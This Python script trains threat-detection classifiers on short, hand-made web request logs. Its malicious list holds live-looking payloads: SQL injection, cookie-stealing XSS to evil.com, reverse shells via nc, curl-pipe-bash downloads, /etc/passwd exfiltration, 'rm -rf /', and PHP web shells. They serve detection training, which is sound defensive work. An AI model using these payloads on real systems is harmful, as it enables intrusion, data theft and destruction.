#!/usr/bin/env python3


# ML Model Training for Threat Detection :)


import os
import joblib
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix

print("🤖 Advanced ML Model Training for Threat Detection")
print("=" * 60)

os.makedirs("models", exist_ok=True)


benign_logs = [
    # API requests
    "GET /api/health HTTP/1.1", "GET /api/status HTTP/1.1",
    "GET /api/users/profile HTTP/1.1", "GET /api/orders HTTP/1.1",
    "POST /api/login username=john password=hashed", "POST /api/logout HTTP/1.1",
    "GET /api/products?category=electronics HTTP/1.1",
    "GET /api/search?q=laptop HTTP/1.1", "GET /api/cart HTTP/1.1",
    "POST /api/checkout HTTP/1.1", "GET /api/notifications HTTP/1.1",
    
    # Static resources
    "GET /static/css/style.css HTTP/1.1", "GET /static/js/app.js HTTP/1.1",
    "GET /images/logo.png HTTP/1.1", "GET /favicon.ico HTTP/1.1",
    "GET /robots.txt HTTP/1.1", "GET /sitemap.xml HTTP/1.1",
    
    # Documentation
    "GET /docs/api/v1 HTTP/1.1", "GET /docs/index.html HTTP/1.1",
    "GET /swagger/index.html HTTP/1.1",
    
    # Normal user actions
    "POST /api/comments comment=Great article!", 
    "PUT /api/users/settings theme=dark language=en",
    "POST /api/contact email=user@example.com message=Help needed",
    "GET /api/dashboard HTTP/1.1", "GET /api/analytics HTTP/1.1",
    "POST /api/feedback rating=5 comment=Excellent",
    
    # Authentication (normal)
    "POST /api/register username=newuser email=new@example.com",
    "POST /api/password-reset email=user@example.com",
    "POST /api/verify-email token=abc123def456",
    "GET /api/user/settings HTTP/1.1",
    
    # E-commerce
    "GET /api/products/123 HTTP/1.1", "POST /api/cart/add product_id=456",
    "GET /api/orders/789 HTTP/1.1", "POST /api/reviews product=123 rating=4",
    "GET /api/categories HTTP/1.1", "GET /api/brands HTTP/1.1",
    
    # Social features
    "POST /api/posts content=Hello world!", "GET /api/feed HTTP/1.1",
    "POST /api/like post_id=123", "POST /api/share post_id=456",
    "GET /api/friends HTTP/1.1", "GET /api/messages HTTP/1.1",
    
    # Media
    "GET /api/videos/stream/123 HTTP/1.1", "GET /api/images/thumbnail/456",
    "POST /api/upload/avatar file=photo.jpg", "GET /api/playlist/789",
    
    # More normal patterns
    "GET /api/weather?location=Seattle HTTP/1.1",
    "GET /api/news?category=tech HTTP/1.1",
    "POST /api/subscribe email=user@example.com",
    "GET /api/calendar/events HTTP/1.1",
    "POST /api/tasks title=Buy groceries",
    "GET /api/bookmarks HTTP/1.1",
    "POST /api/notes content=Meeting at 3pm",
    "GET /api/files/document.pdf HTTP/1.1",
    "POST /api/export format=csv",
    "GET /api/reports/monthly HTTP/1.1",
] * 2  

malicious_logs = [
    # SQL Injection 
    "GET /api/users?id=1' OR '1'='1'--",
    "POST /login username=admin' OR 1=1-- password=x",
    "GET /products?id=1 UNION SELECT username,password FROM users--",
    "GET /search?q='; DROP TABLE users; --",
    "POST /api/query sql=SELECT * FROM admin WHERE '1'='1",
    "GET /user?id=1'; EXEC xp_cmdshell('dir')--",
    "POST /login user=admin'/**/OR/**/1=1--",
    "GET /api/data?filter=' UNION ALL SELECT NULL,NULL,NULL--",
    "GET /products?category=electronics' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
    "POST /search query=test' OR 'a'='a",
    "GET /api/users?id=1' AND '1'='1' AND '1",
    "GET /page?id=1 AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='u'))",
    
    # XSS Attacks 
    "POST /comment body=<script>alert('XSS')</script>",
    "GET /search?q=<script>document.location='http://evil.com'</script>",
    "POST /profile name=<img src=x onerror=alert(1)>",
    "GET /page?redirect=javascript:alert(document.cookie)",
    "POST /comment <iframe src=http://attacker.com></iframe>",
    "GET /search?q=<svg/onload=alert(1)>",
    "POST /message content=<body onload=alert('XSS')>",
    "GET /user?name=<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
    "POST /post title=<script src=http://evil.com/xss.js></script>",
    "GET /page?x=<iframe src=javascript:alert('XSS')>",
    
    # Path Traversal
    "GET /download?file=../../../../etc/passwd",
    "GET /files?path=../../windows/system32/config/sam",
    "POST /upload filename=../../../var/www/shell.php",
    "GET /api/file?name=..%2F..%2Fetc%2Fshadow",
    "GET /download?file=....//....//etc/passwd",
    "GET /read?path=..\\..\\..\\windows\\win.ini",
    "GET /api/logs?file=/var/log/../../etc/passwd",
    "POST /backup path=../../../../root/.ssh/id_rsa",
    
    # Command Injection
    "GET /ping?host=8.8.8.8; cat /etc/passwd",
    "POST /exec cmd=ls -la; nc attacker.com 4444 -e /bin/bash",
    "GET /api/ping?ip=127.0.0.1 | whoami",
    "POST /system command=rm -rf /",
    "GET /shell?cmd=`curl http://evil.com/backdoor.sh | bash`",
    "POST /backup path=/data && tar -czf - /etc | nc evil.com 1234",
    "GET /convert?file=image.jpg & wget http://evil.com/malware",
    "POST /process cmd=convert image.png $(wget evil.com/shell.sh -O /tmp/s.sh)",
    "GET /api/tools?util=nslookup; curl evil.com/exfiltrate -d @/etc/passwd",
    
    # LDAP Injection
    "POST /login username=*)(uid=*))(|(uid=* password=x",
    "GET /search?filter=(&(uid=*)(userPassword=*))",
    "POST /auth user=admin)(&(password=*",
    "GET /directory?query=(|(uid=*)(cn=*))",
    
    # XML Injection / XXE
    "POST /api/parse xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    "POST /upload <?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>",
    
    # NoSQL Injection
    "POST /login {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
    "GET /api/users?query={\"$where\": \"this.password.match(/.*/);\"}",
    
    # Malware/Webshell
    "POST /upload content=<?php eval($_POST['cmd']); ?>",
    "GET /shell.php?cmd=system('cat /etc/passwd')",
    "POST /backdoor <?php system($_GET['c']); ?>",
    "POST /upload file=<?php passthru($_GET['cmd']); ?>",
    "GET /c99.php?act=cmd&d=/etc&cmd=ls",
    "POST /ws.php <?php exec($_REQUEST['x']); ?>",
    "GET /shell?c=<?php echo shell_exec($_GET['e']); ?>",
    
    # Scanner/Enumeration
    "GET /admin/ HTTP/1.1 User-Agent: Nikto/2.1.6",
    "GET /config.php HTTP/1.1 User-Agent: sqlmap/1.5",
    "GET /.git/config HTTP/1.1 User-Agent: WPScan",
    "GET /phpmyadmin/ HTTP/1.1 User-Agent: Metasploit",
    "GET /.env HTTP/1.1 User-Agent: DirBuster",
    "GET /backup.sql HTTP/1.1 User-Agent: Acunetix",
    "GET /wp-admin/ User-Agent: Masscan/1.0",
    "GET /.aws/credentials User-Agent: nuclei",
    
    # SSRF
    "GET /fetch?url=http://169.254.169.254/latest/meta-data/",
    "POST /proxy url=http://localhost:8080/admin",
    "GET /api/image?src=http://internal-server/secrets",
    
    # Template Injection
    "GET /page?name={{7*7}}",
    "POST /render template={{config.items()}}",
    "GET /view?template=${7*7}",
    
    # Deserialization
    "POST /api/session data=O:8:\"stdClass\":1:{s:4:\"exec\";s:10:\"/bin/bash\";}",
]

print(f"\n📊 Training Dataset:")
print(f"   Benign samples: {len(benign_logs)}")
print(f"   Malicious samples: {len(malicious_logs)}")
print(f"   Total: {len(benign_logs) + len(malicious_logs)}")

# Combine data
all_logs = benign_logs + malicious_logs
labels = [0] * len(benign_logs) + [1] * len(malicious_logs)

# Split train/test
X_train_text, X_test_text, y_train, y_test = train_test_split(
    all_logs, labels, test_size=0.2, random_state=42, stratify=labels
)

print(f"   Training set: {len(X_train_text)}")
print(f"   Test set: {len(X_test_text)}")


print("\n🔧 Training TF-IDF Vectorizer...")

vectorizer = TfidfVectorizer(
    max_features=1000,
    ngram_range=(1, 4),
    analyzer='char',
    min_df=1,
    max_df=0.95,
    lowercase=True,
    sublinear_tf=True  
)

X_train = vectorizer.fit_transform(X_train_text)
X_test = vectorizer.transform(X_test_text)

print(f"   ✅ Features: {X_train.shape[1]}")
joblib.dump(vectorizer, "models/tfidf_vectorizer.pkl")
print(f"   ✅ Saved: models/tfidf_vectorizer.pkl")


print("\n🔧 Training Isolation Forest...")

iso_forest = IsolationForest(
    contamination=0.4,
    n_estimators=200,
    max_samples='auto',
    random_state=42,
    n_jobs=-1
)

iso_forest.fit(X_train)
joblib.dump(iso_forest, "models/anomaly_model.pkl")
print(f"   ✅ Saved: models/anomaly_model.pkl")

# Evaluate
y_pred_iso = iso_forest.predict(X_test)
y_pred_iso = [1 if p == -1 else 0 for p in y_pred_iso]  
accuracy_iso = sum(p == l for p, l in zip(y_pred_iso, y_test)) / len(y_test)
print(f"   Accuracy: {accuracy_iso * 100:.1f}%")


print("\n🔧 Training Random Forest Classifier (Supervised)...")

rf = RandomForestClassifier(
    n_estimators=100,
    max_depth=20,
    random_state=42,
    n_jobs=-1
)

rf.fit(X_train, y_train)
joblib.dump(rf, "models/random_forest_model.pkl")
print(f"   ✅ Saved: models/random_forest_model.pkl")

# Evaluate
y_pred_rf = rf.predict(X_test)
accuracy_rf = sum(p == l for p, l in zip(y_pred_rf, y_test)) / len(y_test)
print(f"   Accuracy: {accuracy_rf * 100:.1f}%")

# Cross-validation
cv_scores = cross_val_score(rf, X_train, y_train, cv=5)
print(f"   Cross-val accuracy: {cv_scores.mean() * 100:.1f}% (+/- {cv_scores.std() * 100:.1f}%)")


print("\n📊 Model Comparison:")
print(f"   Isolation Forest: {accuracy_iso * 100:.1f}%")
print(f"   Random Forest:    {accuracy_rf * 100:.1f}%")

print("\n📈 Classification Report (Random Forest):")
print(classification_report(y_test, y_pred_rf, target_names=['Benign', 'Malicious']))

print("\n🔍 Confusion Matrix (Random Forest):")
cm = confusion_matrix(y_test, y_pred_rf)
print(f"   True Negatives:  {cm[0][0]}")
print(f"   False Positives: {cm[0][1]}")
print(f"   False Negatives: {cm[1][0]}")
print(f"   True Positives:  {cm[1][1]}")


print("\n🧪 Testing on New Examples:")

test_examples = [
    ("Normal API call", "GET /api/users/123 HTTP/1.1"),
    ("SQL Injection", "GET /users?id=1' UNION SELECT * FROM passwords--"),
    ("XSS Attack", "<script>fetch('http://evil.com?c='+document.cookie)</script>"),
    ("Path Traversal", "GET /files/../../../../../../etc/passwd"),
    ("Command Injection", "GET /ping?host=google.com; rm -rf /"),
    ("Normal Login", "POST /login username=john password=securepass123"),
]

for name, payload in test_examples:
    X_ex = vectorizer.transform([payload])
    
    # Isolation Forest
    iso_score = iso_forest.decision_function(X_ex)[0]
    iso_risk = max(min((1 - iso_score) * 100, 100.0), 0.0)
    
    # Random Forest
    rf_pred = rf.predict(X_ex)[0]
    rf_proba = rf.predict_proba(X_ex)[0]
    rf_confidence = rf_proba[rf_pred] * 100
    
    status = "🚨" if rf_pred == 1 else "✅"
    print(f"{status} {name:25s} | ISO Risk: {iso_risk:5.1f} | RF: {'THREAT' if rf_pred else 'SAFE':6s} ({rf_confidence:.0f}%)")

print("\n" + "=" * 60)
print("✅ Advanced ML Training Complete!")
print("=" * 60)
print("\n📦 Models Created:")
print("   1. tfidf_vectorizer.pkl - Text feature extraction")
print("   2. anomaly_model.pkl - Isolation Forest (unsupervised)")
print("   3. random_forest_model.pkl - Random Forest (supervised)")
print("\n💡 Tip: The detection service uses anomaly_model.pkl by default")
print("   You can modify it to use random_forest_model.pkl for better accuracy")
print("\n" + "=" * 60)
